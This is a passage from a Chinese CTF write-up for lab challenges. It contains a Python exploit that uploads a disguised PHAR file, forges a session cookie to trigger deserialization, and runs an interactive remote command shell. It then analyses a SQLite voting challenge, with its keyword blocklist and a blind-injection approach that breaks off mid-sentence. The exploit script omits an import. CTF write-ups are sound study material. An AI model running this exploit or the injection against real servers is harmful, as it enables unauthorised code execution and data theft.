    import json
    import re
    import requests
    import urllib.parse
    url = 'http://192.168.233.136:9003/'
    def b64decode(s):
        return base64.urlsafe_b64decode(s + '=' * (3 - (3 + len(s)) % 4))
    sess = requests.Session()
    username = b"peri0d".decode()
    url_1 = url + 'signin.php'
    sess.post(url=url_1, data={'name': username})
    url_2 = url + 'upload.php'
    f = open('exp.phar', 'rb')
    sess.post(url_2, files={'file': ('exp.png', f)})
    data = sess.cookies['session'].split('.')[0]
    data = json.loads(b64decode(data))
    avatar = data['avatar']
    url_3 = url + 'upload.php'
    sess.get(url_3, allow_redirects=False)
    data, sig = sess.cookies['session'].split('.')
    data = b64decode(data)
    payload = data.replace(b'}}', '}},"theme":"phar://uploads/{}/exp"}}'.format(avatar).encode())
    sess.cookies.set('session', base64.b64encode(payload).decode().replace('=', '') + '.' + sig)
    while True:
        command = input('> ')
        c = sess.get(url + '?cmd=' + urllib.parse.quote(command)).content.decode()
        result = re.findall(r'/\* light/dark.css \*/(.+)/\*\*/', c, flags=re.DOTALL)[0]
        print(result.strip())
# Sqlite Voting [350]
  * 打开靶机，看到投票的页面，并且给了源码
  * 在 `vote.php` 页面 `POST` 参数 `id` ，只能为数字。并且在 `schema.sql` 中发现了 `flag` 表
    DROP TABLE IF EXISTS `vote`;
      CREATE TABLE `vote` (
        `id` INTEGER PRIMARY KEY AUTOINCREMENT,
        `name` TEXT NOT NULL,
        `count` INTEGER
      );
      INSERT INTO `vote` (`name`, `count`) VALUES
        ('dog', 0),
        ('cat', 0),
        ('zebra', 0),
        ('koala', 0);
      DROP TABLE IF EXISTS `flag`;
      CREATE TABLE `flag` (
        `flag` TEXT NOT NULL
      );
      INSERT INTO `flag` VALUES ('HarekazeCTF{}');
  * 在 `vote.php` 中给出了查询的 SQL 语句，但是对参数进行了检测
    function is_valid($str) {
        $banword = [
          // dangerous chars
          // " % ' * + /  \ _ ` ~ -          "[\"%'*+\\/\\\\_`~-]",
          // whitespace chars
          '\s',
          // dangerous functions
          'blob', 'load_extension', 'char', 'unicode',
          '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',
          'in', 'limit', 'order', 'union', 'join'
        ];
        $regexp = '/' . implode('|', $banword) . '/i';
        if (preg_match($regexp, $str)) {
          return false;
        }
        return true;
      }
      $id = $_POST['id'];
      if (!is_valid($id)) {
        die(json_encode(['error' => 'Vote id contains dangerous chars']));
      }
      $pdo = new PDO('sqlite:../db/vote.db');
      $res = $pdo->query("UPDATE vote SET count = count + 1 WHERE id = ${id}");
      if ($res === false) {
        die(json_encode(['error' => 'An error occurred while updating database']));
      }
  * `UPDATE` 成功与失败分别对应了不同的页面，那么是不是可以进行盲注，但是考虑到它过滤了 `'` 和 `"` 这就无法使用字符进行判断，`char` 又被过滤也无法使用 ASCII 码判断
  * 所以可以考虑使用 `hex` 进行字符判断，将所有的的字符串组合用有限的 36 个字符表示
  * 先考虑对 flag 16 进制长度的判断，假设它的长度为 `x`，`y` 表示 2 的 n 次方，那么 `x&y` 就能表现出 `x` 二进制为 1 的位置，将这些 `y` 再进行或运算就可以得到完整的 `x` 的二进制，也就得到了 flag 的长度，而 `1
  * 